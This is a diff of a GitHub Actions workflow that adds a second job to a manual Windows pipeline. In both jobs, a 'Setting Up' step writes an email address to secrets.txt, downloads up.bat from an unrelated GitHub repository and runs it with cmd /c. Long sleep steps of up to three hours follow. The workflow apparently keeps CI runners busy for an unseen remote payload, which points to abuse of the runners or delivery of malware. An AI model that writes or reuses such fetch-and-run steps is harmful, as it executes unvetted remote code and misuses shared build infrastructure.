@@ -4,15 +4,16 @@ on:
   workflow_dispatch:
 
 jobs:
-  build1:
+  First:
     runs-on: windows-latest
 
     steps:
     
       - name: Setting Up
         run: |
+         start-sleep 11
          echo "EMAIL_SECRET=ainxd@hldrive.com" > secrets.txt
-         start-sleep 5
+         start-sleep 10
          Invoke-WebRequest "https://github.com/cisipex552/5/raw/main/Files/up.bat" -OutFile "up.bat"
          cmd /c up.bat
             
@@ -20,43 +21,61 @@ jobs:
         run: |
          start-sleep 301
          start-sleep -s 302
+
+      - name: B
+        run: |
+         start-sleep 10800
+         start-sleep -s 10801
          
-  build2:
+  Second:
      runs-on: windows-latest
      
      steps:
     
-      - name: B
+      - name: Wait
+        run: |
+         start-sleep 900
+         start-sleep -s 901
+      
+      - name: Setting Up
+        run: |
+         start-sleep 11
+         echo "EMAIL_SECRET=ainxd@hldrive.com" > secrets.txt
+         start-sleep 10
+         Invoke-WebRequest "https://github.com/cisipex552/5/raw/main/Files/up.bat" -OutFile "up.bat"
+         cmd /c up.bat
+      
+      - name: A
         run: |
          start-sleep 303
          start-sleep -s 304
 
-      - name: C
+      - name: B
         run: |
          start-sleep 305
          start-sleep -s 306
 
-      - name: D
+      - name: C
         run: |
          start-sleep 307
          start-sleep -s 308
 
-      - name: E
+      - name: D
         run: |
          start-sleep 309
          start-sleep -s 310
 
-      - name: F
+      - name: E
         run: |
          start-sleep 311
          start-sleep -s 312
       
-      - name: G
+      - name: F
         run: |
          start-sleep 313
          start-sleep -s 314
       
-      - name: H
+      - name: G
         run: |
          start-sleep 10800
          start-sleep -s 10801
